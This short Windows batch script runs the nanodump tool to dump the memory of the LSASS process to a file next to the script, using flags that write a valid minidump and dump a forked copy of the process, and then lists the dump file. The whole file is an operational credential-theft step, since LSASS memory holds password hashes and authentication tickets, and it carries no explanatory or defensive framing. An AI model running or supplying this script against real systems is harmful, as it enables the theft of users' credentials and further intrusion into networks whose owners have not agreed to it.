@echo off
.\nanodump.x64.exe --write "%~dp0lsass_nanodump.dmp" --valid --fork
echo Done.
dir "%~dp0lsass_nanodump.dmp"
